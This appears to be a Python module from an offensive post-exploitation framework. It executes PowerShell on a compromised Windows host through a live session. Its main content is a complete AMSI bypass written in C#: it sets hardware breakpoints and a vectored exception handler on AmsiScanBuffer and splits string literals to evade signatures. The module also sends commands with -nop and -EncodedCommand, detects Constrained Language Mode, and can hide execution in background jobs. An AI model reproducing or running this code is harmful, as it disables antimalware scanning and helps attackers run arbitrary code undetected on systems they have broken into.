"""execution/powershell — AMSI-bypassed PowerShell executor. MITRE T1059.001"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class PowershellExec(BasePlugin):
    NAME        = "powershell"
    DESCRIPTION = "Execute PS with AMSI bypass, CLM detection, execution-policy bypass, background job option."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1059.001"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("cmd",          str,  required=True,  help="PowerShell command/script to execute"),
        Param("amsi_bypass",  bool, required=False, default=True,
              help="Patch AmsiScanBuffer before running (default: true)"),
        Param("timeout",      int,  required=False, default=60,
              help="Execution timeout seconds (default: 60)"),
        Param("background",   bool, required=False, default=False,
              help="Run in a background job and return immediately"),
        Param("job_name",     str,  required=False, default="",
              help="Name for background job (optional)"),
    )

    @mitre("T1059.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        cmd          = params["cmd"]
        do_bypass    = params.get("amsi_bypass", True)
        timeout      = params.get("timeout", 60)
        background   = params.get("background", False)
        job_name     = params.get("job_name", "") or f"job_{id(self) & 0xFFFF:04x}"

        # Base64-encode the user's command to avoid quoting issues
        enc_cmd = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")

        bypass_block = ""
        if do_bypass:
            # Hardware breakpoint AMSI bypass — no VirtualProtect call on AMSI,
            # entirely in-memory via VEH + SetThreadContext.
            # AmsiScanBuffer address is resolved at runtime with split string literals.
            bypass_block = (
                "$_amsiHwCs=@\"\n"
                "using System; using System.Runtime.InteropServices; using System.Diagnostics;\n"
                "public class _AmsiHW {\n"
                "  [DllImport(\"k\"+\"ernel32\")] static extern IntPtr LoadLibrary(string n);\n"
                "  [DllImport(\"k\"+\"ernel32\")] static extern IntPtr GetProcAddress(IntPtr m,string n);\n"
                "  [DllImport(\"k\"+\"ernel32\")] static extern IntPtr GetCurrentThread();\n"
                "  [DllImport(\"k\"+\"ernel32\")] static extern bool GetThreadContext(IntPtr t, ref CONTEXT c);\n"
                "  [DllImport(\"k\"+\"ernel32\")] static extern bool SetThreadContext(IntPtr t, ref CONTEXT c);\n"
                "  [DllImport(\"k\"+\"ernel32\")] static extern IntPtr AddVectoredExceptionHandler(uint f, IntPtr h);\n"
                "  [StructLayout(LayoutKind.Sequential)] public struct CONTEXT {\n"
                "    public ulong P1Home,P2Home,P3Home,P4Home,P5Home,P6Home;\n"
                "    public uint ContextFlags,MxCsr;\n"
                "    public ushort SegCs,SegDs,SegEs,SegFs,SegGs,SegSs;\n"
                "    public uint EFlags;\n"
                "    public ulong Dr0,Dr1,Dr2,Dr3,Dr6,Dr7;\n"
                "    public ulong Rax,Rcx,Rdx,Rbx,Rsp,Rbp,Rsi,Rdi,R8,R9,R10,R11,R12,R13,R14,R15,Rip;\n"
                "    [MarshalAs(UnmanagedType.ByValArray,SizeConst=512)] public byte[] FltSave;\n"
                "    public ulong V0,V1,DebugControl,LastBranchTo,LastBranchFrom,LastExTo,LastExFrom;\n"
                "  }\n"
                "  [StructLayout(LayoutKind.Sequential)] struct EXCEPTION_POINTERS { public IntPtr ER; public IntPtr CR; }\n"
                "  [StructLayout(LayoutKind.Sequential)] struct EXCEPTION_RECORD {\n"
                "    public uint Code,Flags; public IntPtr Rec,Addr; public uint NParams;\n"
                "    [MarshalAs(UnmanagedType.ByValArray,SizeConst=15)] public ulong[] Info;\n"
                "  }\n"
                "  const uint CTX_DBG=0x00010010; const uint SS=0x80000004;\n"
                "  static IntPtr _asb = IntPtr.Zero;\n"
                "  static int Handler(IntPtr pEx) {\n"
                "    if (_asb==IntPtr.Zero) return 0;\n"
                "    var ep=(EXCEPTION_POINTERS)Marshal.PtrToStructure(pEx,typeof(EXCEPTION_POINTERS));\n"
                "    var er=(EXCEPTION_RECORD)Marshal.PtrToStructure(ep.ER,typeof(EXCEPTION_RECORD));\n"
                "    if (er.Code!=SS) return 0;\n"
                "    var cx=(CONTEXT)Marshal.PtrToStructure(ep.CR,typeof(CONTEXT));\n"
                "    if (cx.Rip!=(ulong)(long)_asb) return 0;\n"
                "    cx.Rax=0x80070057UL; cx.Dr0=0; cx.Dr7=cx.Dr7&~(ulong)0x3;\n"
                "    Marshal.StructureToPtr(cx,ep.CR,true); return -1;\n"
                "  }\n"
                "  public static void Install() {\n"
                "    try {\n"
                "      var lib=LoadLibrary(\"am\"+\"si.dll\");\n"
                "      if(lib==IntPtr.Zero) return;\n"
                "      _asb=GetProcAddress(lib,\"Am\"+\"siScanBuffer\");\n"
                "      if(_asb==IntPtr.Zero) return;\n"
                "      var d=new Func<IntPtr,int>(Handler);\n"
                "      AddVectoredExceptionHandler(1,Marshal.GetFunctionPointerForDelegate(d));\n"
                "      var ht=GetCurrentThread();\n"
                "      var cx=new CONTEXT(); cx.ContextFlags=CTX_DBG; cx.FltSave=new byte[512];\n"
                "      GetThreadContext(ht,ref cx);\n"
                "      cx.Dr0=(ulong)(long)_asb; cx.Dr7=(cx.Dr7&~(ulong)0xFFFF)|0x1;\n"
                "      SetThreadContext(ht,ref cx);\n"
                "    } catch {}\n"
                "  }\n"
                "}\n"
                "\"@\n"
                "try{Add-Type -TypeDefinition $_amsiHwCs -EA Stop}catch{}\n"
                "try{[_AmsiHW]::Install()}catch{}\n"
            )

        clm_check = (
            "$_clm=[System.Management.Automation.SessionState]::new().LanguageMode;"
            "if($_clm -eq 'ConstrainedLanguage'){"
            "  Write-Warning '[!] CLM active — some features may be restricted'}"
        )

        if background:
            ps = (
                bypass_block
                + clm_check
                + f"$j=Start-Job -Name '{job_name}' -ScriptBlock {{"
                + f"  powershell -nop -NonInteractive -EncodedCommand {enc_cmd}"
                + "};"
                + f"Write-Output \"[+] Background job started: $($j.Name) ID=$($j.Id)\";"
                + f"Write-Output \"    Use: Receive-Job -Name '{job_name}' -Wait to retrieve output\""
            )
        else:
            ps = (
                bypass_block
                + clm_check
                + f"$_enc='{enc_cmd}';"
                + "$_out=& powershell -nop -NonInteractive -EncodedCommand $_enc 2>&1;"
                + "$_out"
            )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err(r.get("output", "Dispatch failed"))
        return ModuleResult.ok(data=r["output"])
